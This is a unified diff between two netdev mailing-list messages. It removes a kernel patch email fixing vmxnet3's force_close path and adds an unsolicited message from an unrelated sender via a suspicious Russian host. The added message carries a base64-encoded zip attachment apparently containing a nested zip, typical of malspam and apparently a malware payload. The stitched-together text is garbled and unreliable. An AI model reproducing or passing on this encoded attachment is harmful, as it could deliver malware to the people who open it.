@@ -1,58 +1,52 @@
-From: Neil Horman <nhorman@tuxdriver.com>
-Subject: [PATCH] vmxnet3: ensure that adapter is in proper state during force_close
-Date: Fri, 12 May 2017 12:00:01 -0400
-Message-ID: <20170512160001.24425-1-nhorman@tuxdriver.com>
-Cc: Neil Horman <nhorman@tuxdriver.com>,
-        Shrikrishna Khare <skhare@vmware.com>,
-        "VMware, Inc." <pv-drivers@vmware.com>,
-        "David S. Miller" <davem@davemloft.net>
-To: netdev@vger.kernel.org
+From: <mari.kayhko@uef.fi>
+Subject: 48683 netdev
+Date: Fri, 12 May 2017 16:02:26 -0000
+Message-ID: <149460494628.15597.16625504933276786597@isurgut.ru>
+Mime-Version: 1.0
+Content-Type: application/zip; name="829.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from charlotte.tuxdriver.com ([70.61.120.58]:33317 "EHLO
-        smtp.tuxdriver.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1756671AbdELQAp (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Fri, 12 May 2017 12:00:45 -0400
+Received: from 90-151-207-59.pppoe-adsl.isurgut.ru ([90.151.207.59]:46877 "HELO
+        isurgut.ru" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1755233AbdELQCa (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Fri, 12 May 2017 12:02:30 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-There are several paths in vmxnet3, where settings changes cause the
-adapter to be brought down and back up (vmxnet3_set_ringparam among
-them).  Should part of the reset operation fail, these paths call
-vmxnet3_force_close, which enables all napi instances prior to calling
-dev_close (with the expectation that vmxnet3_close will then properly
-disable them again).  However, vmxnet3_force_close neglects to clear
-VMXNET3_STATE_BIT_QUIESCED prior to calling dev_close.  As a result
-vmxnet3_quiesce_dev (called from vmxnet3_close), returns early, and
-leaves all the napi instances in a enabled state while the device itself
-is closed.  If a device in this state is activated again, napi_enable
-will be called on already enabled napi_instances, leading to a BUG halt.
-
-The fix is to simply enausre that the QUIESCED bit is cleared in
-vmxnet3_force_close to allow quesence to be completed properly on close.
-
-Signed-off-by: Neil Horman <nhorman@tuxdriver.com>
-CC: Shrikrishna Khare <skhare@vmware.com>
-CC: "VMware, Inc." <pv-drivers@vmware.com>
-CC: "David S. Miller" <davem@davemloft.net>
----
- drivers/net/vmxnet3/vmxnet3_drv.c | 5 +++++
- 1 file changed, 5 insertions(+)
-
-diff --git a/drivers/net/vmxnet3/vmxnet3_drv.c b/drivers/net/vmxnet3/vmxnet3_drv.c
-index 25bc764..d1c7029 100644
---- a/drivers/net/vmxnet3/vmxnet3_drv.c
-+++ b/drivers/net/vmxnet3/vmxnet3_drv.c
-@@ -2962,6 +2962,11 @@ vmxnet3_force_close(struct vmxnet3_adapter *adapter)
- 	/* we need to enable NAPI, otherwise dev_close will deadlock */
- 	for (i = 0; i < adapter->num_rx_queues; i++)
- 		napi_enable(&adapter->rx_queue[i].napi);
-+	/*
-+	 * Need to clear the quiesce bit to ensure that vmxnet3_close
-+	 * can quiesce the device properly
-+	 */
-+	clear_bit(VMXNET3_STATE_BIT_QUIESCED, &adapter->state);
- 	dev_close(adapter->netdev);
- }
- 
--- 
-2.9.3
+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
